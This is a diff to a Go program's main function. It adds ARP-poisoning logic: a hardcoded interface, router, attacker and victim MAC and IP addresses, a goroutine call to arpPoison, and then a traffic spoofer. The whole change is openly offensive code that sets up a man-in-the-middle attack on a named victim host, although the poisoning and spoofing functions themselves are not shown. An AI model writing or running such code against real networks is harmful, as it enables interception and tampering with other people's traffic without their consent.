@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"os"
+	"net"
 )
 
 func main() {
@@ -11,7 +12,24 @@ func main() {
 		return
 	}
 
-	fmt.Println("Running spoofer")
+	var dev string = "eno1"
 
-	spoof("wlp3s0")
+	fmt.Println("Running arp poison")
+	routerMac, err := net.ParseMAC("00:1A:6D:38:15:FF")
+	routerIP := net.IP{192, 168, 0, 100}
+	localMac, err := net.ParseMAC("98:90:96:D5:84:7B")
+	localIP := net.IP{192, 168, 0, 9}
+	victimMac, err := net.ParseMAC("98:90:96:DC:fB:6A")
+	victimIP := net.IP{192, 168, 0, 10}
+	/********* end parse all IP's and MAC's relevent for poisoning / spoofing *********/
+
+	if err != nil {
+		fmt.Println(err)
+		os.Exit(1)
+	}
+
+	go arpPoison(dev, routerMac, routerIP, localMac, localIP, victimMac, victimIP)
+
+	fmt.Println("Running spoofer")
+	spoof(dev)
 }
